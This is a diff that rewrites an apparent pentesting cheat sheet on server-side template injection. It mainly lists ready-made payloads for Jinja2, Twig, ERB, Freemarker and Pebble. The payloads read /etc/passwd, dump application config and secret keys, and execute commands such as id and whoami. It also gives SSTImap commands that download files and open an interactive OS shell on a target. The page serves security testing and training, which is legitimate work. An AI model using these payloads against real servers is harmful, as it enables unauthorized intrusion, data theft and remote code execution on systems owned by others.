@@ -1,12 +1,20 @@
-# SSTI
+# SSTI (Server-Side Template Injection)
 
-[https://github.com/payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)
+[PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) | [SSTI Payloads](https://github.com/payloadbox/ssti-payloads)
 
-Step 1: Find an injection point, attempt basic payloads and see if app is vulnerable to SSTI.
+---
 
-Can be via input box, or in the URL
+## Confirm SSTI
 
-Basic Identification:
+### Break Template Syntax
+
+```
+${{<%[%'"}}%\.
+```
+
+If this causes a server error, SSTI is likely.
+
+### Basic Math Test
 
 ```
 {{7*7}}
@@ -17,54 +25,135 @@ ${{7*7}}
 *{7*7}
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (2) (2).png" alt=""><figcaption></figcaption></figure>
+If `49` appears, template is executing code.
 
-### Exploit
+---
 
-### Jinja2
+## Identify Template Engine
 
-* Dump all the config variables, will show the secret key, if the variable is set
+| Payload | Result | Engine |
+|---------|--------|--------|
+| `${7*7}` | 49 | Freemarker, Thymeleaf, etc. |
+| `{{7*7}}` | 49 | Jinja2, Twig, etc. |
+| `{{7*'7'}}` | 7777777 | **Jinja2** |
+| `{{7*'7'}}` | 49 | **Twig** |
+| `<%= 7*7 %>` | 49 | ERB (Ruby) |
+| `#{7*7}` | 49 | Pebble, Thymeleaf |
 
-```
-{{ config }} 
-```
+---
 
-<figure><img src="../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption></figcaption></figure>
+## Jinja2 (Python/Flask)
 
-### Jinja Injection without \<class 'object'>&#x20;
+### Information Disclosure
 
-* From the there is another way to get to RCE without using that class.&#x20;
-* \*\*\*\*If you manage to get to any function from those globals objects, you will be able to access **globals**.**builtins** and from there the RCE is very simple.&#x20;
-* You can find functions from the objects request, config and any other interesting global object you have access to with:&#x20;
+```jinja2
+# Dump config (includes secret keys)
+{{ config.items() }}
 
-```
-{{ request.__class__.__dict__ }}
-application
-_load_form_data
-on_json_loading_failed ​ {{ config.class.dict }}
-init
-from_envvar
-from_pyfile
-from_object
-from_file
-from_json
-from_mapping
-get_namespace
-repr ​
-# You can iterate through children objects to find more
+# Dump builtins
+{{ self.__init__.__globals__.__builtins__ }}
 ```
 
-* Once you have found some functions you can recover the builtins with:
+### Local File Read
 
-```
-# Read File
-{{ request.class._load_form_data.globals.builtins.open("/etc/passwd").read() }} ​
-# RCE
-{{ config.class.from_envvar.globals.builtins.import("os").popen("ls").read() }} {{ config.class.from_envvar["globals"]["builtins"]"import".popen("ls").read() }} {{ (config|attr("class")).from_envvar["globals"]["builtins"]"import".popen("ls").read() }} ​
-{{ a }}​ ## Extra ## The global from config have a access to a function called import_string ## with this function you don't need to access the builtins {{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }} ​ 
-# All the bypasses seen in the previous sections are also valid
+```jinja2
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-If it is, the next step is determining the engine that is running the application&#x20;
+### RCE
 
-[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+```jinja2
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+### Alternative Paths to RCE
+
+```jinja2
+# Via request object
+{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
+
+# Via config object
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("whoami").read() }}
+
+# Via import_string
+{{ config.__class__.from_envvar.__globals__.import_string("os").popen("id").read() }}
+```
+
+---
+
+## Twig (PHP/Symfony)
+
+### Information Disclosure
+
+```twig
+{{ _self }}
+```
+
+### Local File Read (Symfony only)
+
+```twig
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+```
+
+### RCE
+
+```twig
+{{ ['id'] | filter('system') }}
+{{ ['cat /etc/passwd'] | filter('system') }}
+{{ ['whoami'] | map('system') }}
+```
+
+---
+
+## SSTImap (Automated Tool)
+
+```bash
+# Install
+git clone https://github.com/vladko312/SSTImap
+cd SSTImap
+pip3 install -r requirements.txt
+
+# Auto-detect SSTI
+python3 sstimap.py -u "http://TARGET/page?name=test"
+
+# Download file
+python3 sstimap.py -u "http://TARGET/page?name=test" -D '/etc/passwd' './passwd'
+
+# Execute command
+python3 sstimap.py -u "http://TARGET/page?name=test" -S id
+
+# Interactive shell
+python3 sstimap.py -u "http://TARGET/page?name=test" --os-shell
+```
+
+---
+
+## Other Engines Quick Reference
+
+### ERB (Ruby)
+
+```erb
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').readlines() %>
+```
+
+### Freemarker (Java)
+
+```freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+```
+
+### Pebble (Java)
+
+```
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
+```
+
+---
+
+## Resources
+
+- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
